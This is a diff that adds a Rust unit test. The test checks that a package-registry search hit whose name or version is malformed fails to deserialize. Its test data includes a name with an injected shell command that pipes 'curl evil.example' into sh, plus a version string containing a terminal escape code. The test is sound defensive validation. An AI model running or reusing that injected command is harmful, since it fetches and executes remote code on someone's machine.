@@ -363,6 +363,22 @@ mod tests {
         assert_eq!(bare.description, "");
     }
 
+    #[ignore = "flipped by T4"]
+    #[specforge_test_macros::test(
+        type = "SearchHit",
+        verify = "a search hit whose name is no package name or whose version is no SemVer version does not read"
+    )]
+    fn a_search_hit_is_a_package_name_and_a_version() {
+        let hostile = json!({"name": "@sdk/greet; curl evil.example|sh", "version": "9.9.9"});
+        assert!(serde_json::from_value::<SearchHit>(hostile.clone()).is_err());
+        let odd_version = json!({"name": "@sdk/x", "version": "1.0.0\u{1b}[31m"});
+        assert!(serde_json::from_value::<SearchHit>(odd_version).is_err());
+        let good = json!({"name": "@sdk/x", "version": "1.0.0"});
+        assert!(
+            serde_json::from_value::<SearchResults>(json!({"results": [good, hostile]})).is_err()
+        );
+    }
+
     #[specforge_test_macros::test(
         type = "PublishReceipt",
         verify = "PublishReceipt is the JSON a registry answers a publish with"
